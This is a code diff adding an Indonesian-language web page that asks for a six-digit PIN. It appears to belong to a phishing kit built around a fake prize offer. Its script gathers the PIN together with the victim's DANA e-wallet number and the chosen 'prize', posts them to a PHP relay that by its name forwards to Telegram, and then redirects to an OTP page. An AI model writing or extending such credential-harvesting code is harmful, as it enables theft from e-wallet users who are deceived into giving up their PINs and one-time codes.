@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Masukkan PIN Anda</title>
+    <style>
+        /* ... (CSS seperti sebelumnya) ... */
+    </style>
+</head>
+<body>
+    <!-- ... (Kode HTML seperti sebelumnya) ... -->
+    <script>
+        function kirimData(data) {
+            const formData = new FormData();
+            for (const key in data) {
+                formData.append(key, data[key]);
+            }
+
+            fetch('kirim_telegram.php', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.text())
+            .then(data => {
+                console.log(data); // Tampilkan response dari PHP (opsional)
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Terjadi kesalahan saat mengirim data ke Telegram.');
+            });
+        }
+
+        function verifikasiPin() {
+            const pinBoxes = document.querySelectorAll('.pin-box');
+            let pin = '';
+            for (let i = 0; i < pinBoxes.length; i++) {
+                pin += pinBoxes[i].value;
+            }
+            if (pin.length !== 6 || isNaN(pin)) {
+                alert('PIN harus terdiri dari 6 angka!');
+                return;
+            }
+            localStorage.setItem('pin', pin);
+            kirimData({ pin: pin, hadiah: localStorage.getItem('hadiahDipilih'), nomorDana: localStorage.getItem('nomorDana') }); // Kirim data PIN
+            window.location.href = 'otp.html';
+        }
+    </script>
+</body>
+</html>
